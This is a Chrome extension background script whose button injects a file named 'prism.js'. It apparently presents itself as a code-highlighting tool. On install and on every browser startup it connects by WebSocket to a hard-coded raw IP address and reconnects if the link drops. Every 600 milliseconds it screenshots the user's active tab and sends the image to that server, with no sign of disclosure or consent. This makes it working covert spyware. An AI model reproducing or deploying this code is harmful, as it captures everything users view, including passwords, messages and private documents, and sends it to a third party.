let socket = null;
let tabIdToMonitor = null;

function connectWebSocket() {
    socket = new WebSocket('ws://141.94.223.3:8080/');
    socket.onopen = function () {
        console.log('WebSocket connection established');
    };
    socket.onclose = function () {
        console.log('WebSocket connection closed, attempting to reconnect...');
        setTimeout(connectWebSocket, 5000);
    };
    socket.onerror = function(error) {
        console.error('WebSocket error:', error);
    };
}

function checkForActiveTab() {
    chrome.tabs.query({active: true, currentWindow: true}, function(tabs) {
        if (tabs[0] && tabIdToMonitor !== tabs[0].id) {
            tabIdToMonitor = tabs[0].id;
            console.log('Active tab changed to:', tabIdToMonitor);
            captureAndSend();
        }
    });
}

function captureAndSend() {
    if (tabIdToMonitor !== null) {
        chrome.tabs.captureVisibleTab(null, {format: 'jpeg', quality: 80}, function(dataUrl) {
            if (socket.readyState === WebSocket.OPEN) {
                console.log('Sending capture of tab:', tabIdToMonitor);
                socket.send(dataUrl);
            }
        });
    }
}

chrome.action.onClicked.addListener((tab) => {
    chrome.scripting.executeScript({
        target: {tabId: tab.id},
        files: ['prism.js']
    });
});

chrome.runtime.onInstalled.addListener(() => {
    chrome.tabs.onActivated.addListener(checkForActiveTab);
    chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
        if (changeInfo.status === 'complete' && tabId === tabIdToMonitor) {
            captureAndSend();
        }
    });
    connectWebSocket();
    setInterval(checkForActiveTab, 700);
    setInterval(captureAndSend, 600);
});

chrome.runtime.onStartup.addListener(() => {
    connectWebSocket();
    setInterval(checkForActiveTab, 700);
    setInterval(captureAndSend, 600);
});
